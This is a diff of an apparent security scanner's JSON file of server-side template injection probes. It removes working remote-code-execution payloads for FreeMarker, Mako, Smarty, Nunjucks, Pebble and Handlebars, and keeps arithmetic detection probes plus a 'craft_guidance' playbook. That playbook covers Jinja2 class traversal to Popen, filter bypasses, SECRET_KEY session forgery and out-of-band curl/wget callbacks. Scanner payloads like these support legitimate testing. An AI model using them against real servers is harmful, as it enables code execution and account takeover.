@@ -1,515 +1,7 @@
 {
   "category": "ssti",
-  "craft_guidance": [
-    "1. DETECT ENGINE: Send {{7*7}} and ${7*7} and #{7*7} and <%= 7*7 %>. Result 49 tells you which syntax is evaluated. Then fingerprint: {{7*'7'}} = 7777777 (Jinja2) vs 49 (Twig).",
-    "2. IDENTIFY SANDBOX: After detection, test config/settings access. Jinja2: {{config}}, Twig: {{app.request}}, Freemarker: ${.data_model}, Tornado: {{handler.settings}}.",
-    "3. ESCALATION STRATEGY: Config leak (SECRET_KEY) -> session forgery -> admin. Or: class hierarchy traversal -> find subprocess/os module -> RCE.",
-    "4. JINJA2 RCE: Chain through __mro__/__subclasses__ to find Popen/subprocess. Index varies by Python version. Use: {{''.__class__.__mro__[1].__subclasses__()}} then find the right index.",
-    "5. FILTER BYPASS: If {{ blocked, try {%, if _ blocked use attr()|string, if . blocked use []|attr. Encode via request.args (Jinja2) or URL encoding.",
-    "6. BLIND SSTI: No output? Use timing ({{range(999999999)|list}}) or OOB (curl/wget to Collaborator via RCE chain).",
-    "7. FRAMEWORK HINTS: Flask/Django=Jinja2, PHP=Twig/Smarty, Java=Freemarker/Thymeleaf/Velocity, Ruby=ERB/Slim, Node=Pug/Nunjucks/EJS, Go=text/template.",
-    "8. REAL IMPACT: SSTI almost always leads to RCE. Prioritize over XSS. Even info-only ({{config}}) often leaks SECRET_KEY for session forgery."
-  ],
+  "description": " (core / language-generic)",
   "contexts": {
-    "jinja2": {
-      "description": "Server-Side Template Injection probes for Jinja2 (Flask/Django Python stacks)",
-      "tech_match": [
-        "Flask",
-        "Django",
-        "Python"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{{7*7}}",
-          "description": "Jinja2 arithmetic evaluation \u2014 response containing 49 confirms template execution",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 65,
-          "variables": {}
-        },
-        {
-          "payload": "{{config}}",
-          "description": "Jinja2 config dump \u2014 reveals SECRET_KEY and DEBUG mode",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "SECRET_KEY",
-                "DEBUG"
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 80,
-          "variables": {}
-        }
-      ]
-    },
-    "twig": {
-      "description": "Server-Side Template Injection probes for Twig (PHP/Laravel stacks)",
-      "tech_match": [
-        "PHP",
-        "Laravel"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{{7*7}}",
-          "description": "Twig arithmetic evaluation \u2014 49 confirms SSTI",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 65,
-          "variables": {}
-        },
-        {
-          "payload": "{{7*'7'}}",
-          "description": "Twig string repetition \u2014 7777777 distinguishes Twig from Jinja2",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "7777777"
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 75,
-          "variables": {}
-        }
-      ]
-    },
-    "freemarker": {
-      "description": "Server-Side Template Injection probes for Apache FreeMarker (Java/Spring/Tomcat stacks)",
-      "tech_match": [
-        "Java",
-        "Spring",
-        "Tomcat"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "${7*7}",
-          "description": "FreeMarker expression evaluation \u2014 49 confirms SSTI",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 65,
-          "variables": {}
-        },
-        {
-          "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
-          "description": "FreeMarker RCE probe via Execute class \u2014 uid= in response confirms code execution",
-          "matchers": [
-            {
-              "type": "regex",
-              "pattern": "uid=\\d+"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 95,
-          "variables": {}
-        }
-      ]
-    },
-    "thymeleaf": {
-      "description": "Server-Side Template Injection probes for Thymeleaf (Spring/Java stacks)",
-      "tech_match": [
-        "Spring",
-        "Java"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "__${7*7}__",
-          "description": "Thymeleaf preprocessing expression \u2014 49 confirms SSTI",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 65,
-          "variables": {}
-        }
-      ]
-    },
-    "generic": {
-      "description": "Generic SSTI probes for unknown template engine detection",
-      "tech_match": [],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{{7*7}}",
-          "description": "Mustache/Jinja2/Twig/Handlebars expression probe \u2014 49 confirms evaluation",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        },
-        {
-          "payload": "${7*7}",
-          "description": "EL/FreeMarker/Thymeleaf expression probe \u2014 49 confirms evaluation",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 55,
-          "variables": {}
-        }
-      ]
-    },
-    "mako": {
-      "description": "Server-Side Template Injection probes for Python Mako templates",
-      "tech_match": [
-        "Python",
-        "Pyramid",
-        "TurboGears"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "${7*7}",
-          "description": "Mako expression evaluation \u2014 49 in response confirms Mako template execution",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 60,
-          "variables": {}
-        },
-        {
-          "payload": "<%import os%>${os.popen('id').read()}",
-          "description": "Mako RCE via import tag and os.popen \u2014 uid= in response confirms arbitrary code execution",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "uid="
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 95,
-          "variables": {}
-        },
-        {
-          "payload": "<% import os %>${os.name}",
-          "description": "Mako OS detection via import \u2014 'posix' or 'nt' in response confirms Python code execution within Mako template",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "posix",
-                "nt"
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 85,
-          "variables": {}
-        }
-      ]
-    },
-    "pebble": {
-      "description": "Server-Side Template Injection probes for Java Pebble templates",
-      "tech_match": [
-        "Java",
-        "Spring"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{{ 7 * 7 }}",
-          "description": "Pebble arithmetic evaluation \u2014 49 confirms Pebble template processing",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "49"
-              ],
-              "condition": "or"
-            },
-            {
-              "type": "not_word",
-              "words": [
-                "$49",
-                "49 ",
-                " 49.",
-                "\"49\"",
-                "v49",
-                "#49"
-              ]
-            }
-          ],
-          "severity": "high",
-          "confidence_boost": 60,
-          "variables": {}
-        },
-        {
-          "payload": "{{'freemarker.template.utility.Execute'?new()('id')}}",
-          "description": "Pebble RCE attempt via class instantiation \u2014 uid= confirms code execution if engine allows it",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "uid="
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 90,
-          "variables": {}
-        }
-      ]
-    },
-    "smarty": {
-      "description": "Server-Side Template Injection probes for PHP Smarty templates",
-      "tech_match": [
-        "PHP"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{$smarty.version}",
-          "description": "Smarty version variable \u2014 version number in response confirms Smarty template processing",
-          "matchers": [
-            {
-              "type": "regex",
-              "pattern": "[0-9]+\\.[0-9]+\\.[0-9]+"
-            }
-          ],
-          "severity": "medium",
-          "confidence_boost": 65,
-          "variables": {}
-        },
-        {
-          "payload": "{system('id')}",
-          "description": "Smarty system() function call \u2014 uid= in response confirms RCE via Smarty template injection",
-          "matchers": [
-            {
-              "type": "word",
-              "words": [
-                "uid="
-              ],
-              "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 95,
-          "variables": {}
-        }
-      ]
-    },
     "detection": {
       "description": "Universal SSTI detection probes \u2014 polyglots and engine-specific arithmetic to fingerprint which template engine is active",
       "tech_match": [],
@@ -693,12 +185,9 @@
         }
       ]
     },
-    "nunjucks": {
-      "description": "Server-Side Template Injection probes for Nunjucks (Node.js stacks)",
-      "tech_match": [
-        "Node.js",
-        "Express"
-      ],
+    "generic": {
+      "description": "Generic SSTI probes for unknown template engine detection",
+      "tech_match": [],
       "param_match": [
         "name",
         "template",
@@ -712,8 +201,8 @@
       ],
       "probes": [
         {
-          "payload": "{{range.constructor(\"return 7*7\")()}}",
-          "description": "Nunjucks constructor trick \u2014 range.constructor evaluates JavaScript; 49 confirms code execution in Nunjucks",
+          "payload": "{{7*7}}",
+          "description": "Mustache/Jinja2/Twig/Handlebars expression probe \u2014 49 confirms evaluation",
           "matchers": [
             {
               "type": "word",
@@ -734,87 +223,35 @@
               ]
             }
           ],
-          "severity": "critical",
-          "confidence_boost": 80,
+          "severity": "high",
+          "confidence_boost": 55,
           "variables": {}
         },
         {
-          "payload": "{{range.constructor(\"return global.process.mainModule.require('os').platform()\")()}}",
-          "description": "Nunjucks RCE confirmation \u2014 os.platform() returns 'linux'/'win32'/'darwin' confirming arbitrary code execution",
+          "payload": "${7*7}",
+          "description": "EL/FreeMarker/Thymeleaf expression probe \u2014 49 confirms evaluation",
           "matchers": [
             {
               "type": "word",
               "words": [
-                "linux",
-                "win32",
-                "darwin"
+                "49"
               ],
               "condition": "or"
-            }
-          ],
-          "severity": "critical",
-          "confidence_boost": 95,
-          "variables": {}
-        }
-      ]
-    },
-    "handlebars": {
-      "description": "Server-Side Template Injection probes for Handlebars (Node.js stacks)",
-      "tech_match": [
-        "Node.js",
-        "Express"
-      ],
-      "param_match": [
-        "name",
-        "template",
-        "msg",
-        "text",
-        "title",
-        "comment",
-        "input",
-        "value",
-        "q"
-      ],
-      "probes": [
-        {
-          "payload": "{{this}}",
-          "description": "Handlebars context dump \u2014 reflects the current context object; non-empty output confirms Handlebars processing",
-          "matchers": [
-            {
-              "type": "reflection",
-              "check_variants": true
             },
             {
-              "type": "length_diff",
-              "min_diff": 20
-            }
-          ],
-          "severity": "medium",
-          "confidence_boost": 40,
-          "variables": {}
-        },
-        {
-          "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
-          "description": "Handlebars prototype pollution RCE gadget \u2014 exploits helper lookup chain for code execution; error or unusual output confirms processing",
-          "matchers": [
-            {
-              "type": "status",
-              "status": [
-                500
+              "type": "not_word",
+              "words": [
+                "$49",
+                "49 ",
+                " 49.",
+                "\"49\"",
+                "v49",
+                "#49"
               ]
-            },
-            {
-              "type": "word",
-              "words": [
-                "TypeError",
-                "Cannot read",
-                "undefined"
-              ],
-              "condition": "or"
             }
           ],
-          "severity": "critical",
-          "confidence_boost": 50,
+          "severity": "high",
+          "confidence_boost": 55,
           "variables": {}
         }
       ]
@@ -895,5 +332,15 @@
         }
       ]
     }
-  }
+  },
+  "craft_guidance": [
+    "1. DETECT ENGINE: Send {{7*7}} and ${7*7} and #{7*7} and <%= 7*7 %>. Result 49 tells you which syntax is evaluated. Then fingerprint: {{7*'7'}} = 7777777 (Jinja2) vs 49 (Twig).",
+    "2. IDENTIFY SANDBOX: After detection, test config/settings access. Jinja2: {{config}}, Twig: {{app.request}}, Freemarker: ${.data_model}, Tornado: {{handler.settings}}.",
+    "3. ESCALATION STRATEGY: Config leak (SECRET_KEY) -> session forgery -> admin. Or: class hierarchy traversal -> find subprocess/os module -> RCE.",
+    "4. JINJA2 RCE: Chain through __mro__/__subclasses__ to find Popen/subprocess. Index varies by Python version. Use: {{''.__class__.__mro__[1].__subclasses__()}} then find the right index.",
+    "5. FILTER BYPASS: If {{ blocked, try {%, if _ blocked use attr()|string, if . blocked use []|attr. Encode via request.args (Jinja2) or URL encoding.",
+    "6. BLIND SSTI: No output? Use timing ({{range(999999999)|list}}) or OOB (curl/wget to Collaborator via RCE chain).",
+    "7. FRAMEWORK HINTS: Flask/Django=Jinja2, PHP=Twig/Smarty, Java=Freemarker/Thymeleaf/Velocity, Ruby=ERB/Slim, Node=Pug/Nunjucks/EJS, Go=text/template.",
+    "8. REAL IMPACT: SSTI almost always leads to RCE. Prioritize over XSS. Even info-only ({{config}}) often leaks SECRET_KEY for session forgery."
+  ]
 }
